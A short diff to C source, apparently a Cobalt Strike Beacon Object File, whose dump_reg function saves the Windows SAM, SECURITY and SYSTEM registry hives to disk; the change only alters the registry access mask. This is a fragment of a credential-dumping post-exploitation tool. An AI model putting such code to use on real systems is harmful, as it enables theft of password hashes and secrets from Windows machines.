@@ -46,7 +46,7 @@ void dump_reg(LPSTR path)
 	//dump sam
 	LPCSTR lpSubKey = "SAM";
 	LPCSTR lpFile = PathCombineA(path_buffer, path, "sam.save");
-	RegOpenKeyExA(HKEY_LOCAL_MACHINE, lpSubKey, 0, 0x20019, &hKey);
+	RegOpenKeyExA(HKEY_LOCAL_MACHINE, lpSubKey, 0, 0x20000, &hKey);
 
 	//Check file exist
 	if (FileExists(lpFile)) {
@@ -64,7 +64,7 @@ void dump_reg(LPSTR path)
 
 	ZeroMemory(path_buffer, sizeof(path_buffer));
 	lpFile = PathCombineA(path_buffer, path, "security.save");
-	RegOpenKeyExA(HKEY_LOCAL_MACHINE, lpSubKey, 0, 0x20019, &hKey);
+	RegOpenKeyExA(HKEY_LOCAL_MACHINE, lpSubKey, 0, 0x20000, &hKey);
 
 	if (FileExists(lpFile)) {
 		DeleteFileA(lpFile);
@@ -82,7 +82,7 @@ void dump_reg(LPSTR path)
 
 	ZeroMemory(path_buffer, sizeof(path_buffer));
 	lpFile = PathCombineA(path_buffer, path, "system.save");
-	RegOpenKeyExA(HKEY_LOCAL_MACHINE, lpSubKey, 0, 0x20019, &hKey);
+	RegOpenKeyExA(HKEY_LOCAL_MACHINE, lpSubKey, 0, 0x20000, &hKey);
 	if (FileExists(lpFile)) {
 		DeleteFileA(lpFile);
 		BeaconPrintf(CALLBACK_OUTPUT, "[!] %s already exists. Delete it now\n", lpFile);
